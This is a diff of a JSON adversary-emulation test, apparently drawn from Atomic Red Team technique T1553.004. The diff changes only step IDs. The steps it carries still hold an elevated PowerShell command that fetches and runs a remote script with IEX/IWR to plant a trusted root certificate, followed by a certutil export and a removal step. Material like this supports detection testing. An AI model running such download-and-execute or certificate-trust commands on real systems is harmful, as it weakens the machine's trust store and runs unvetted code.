@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "b94e5e86-ef52-4fff-855d-679de6c166cf",
+      "id": "b87496e9-3e80-52be-b624-dfa10ace6c78",
       "type": "execute-command",
       "data": {
         "command": "IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing) \ncertutil.exe -p #{password} -exportPFX Root 1F3D38F280635F275BE92B87CF83E40E40458400 #{output}",
@@ -16,7 +16,7 @@
       "elevation_required": true
     },
     {
-      "id": "5dacc76e-165a-4b56-9cd6-52a2753783cb",
+      "id": "e2f1ee27-663d-52de-8859-9df606c71504",
       "type": "execute-command",
       "data": {
         "command": "Get-ChildItem -Path Cert:\\ -Recurse | Where-Object { $_.Thumbprint -eq '1F3D38F280635F275BE92B87CF83E40E40458400' } | remove-item",
@@ -27,14 +27,14 @@
   ],
   "flows": [
     {
-      "s": "b94e5e86-ef52-4fff-855d-679de6c166cf",
+      "s": "b87496e9-3e80-52be-b624-dfa10ace6c78",
       "p": "on-success",
-      "o": "5dacc76e-165a-4b56-9cd6-52a2753783cb"
+      "o": "e2f1ee27-663d-52de-8859-9df606c71504"
     },
     {
-      "s": "b94e5e86-ef52-4fff-855d-679de6c166cf",
+      "s": "b87496e9-3e80-52be-b624-dfa10ace6c78",
       "p": "on-failure",
-      "o": "5dacc76e-165a-4b56-9cd6-52a2753783cb"
+      "o": "e2f1ee27-663d-52de-8859-9df606c71504"
     }
   ],
   "tags": [
